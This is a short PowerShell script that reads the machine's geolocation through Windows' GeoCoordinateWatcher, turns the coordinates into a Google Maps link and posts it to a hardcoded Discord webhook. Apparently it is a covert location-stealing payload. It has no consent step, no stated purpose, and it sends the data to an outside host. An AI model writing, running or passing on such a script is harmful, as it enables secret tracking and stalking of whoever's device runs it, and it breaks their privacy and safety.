$WebhookUrl = "https://discord.com/api/webhooks/1510389267241631754/bsEM-H8cxl_Cu7o8Kj5-rOCXAxzMdme_WKZI2vKN3vDCTMKQo5pxT5MT34YYXInQQlpT"

Add-Type -AssemblyName System.Device
$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher

$GeoWatcher.Start()

while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
    Start-Sleep -Milliseconds 200
}

if ($GeoWatcher.Permission -eq 'Denied') {
    $PlainTextMessage = "Location access was denied in Windows Privacy Settings."
} else {
    $Latitude  = $GeoWatcher.Position.Location.Latitude
    $Longitude = $GeoWatcher.Position.Location.Longitude

    $PlainTextMessage = "Users Current Location: https://www.google.com/maps?q=$Latitude,$Longitude"
}

$Body = @{
    content = $PlainTextMessage
} | ConvertTo-Json

Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Body -ContentType "application/json"
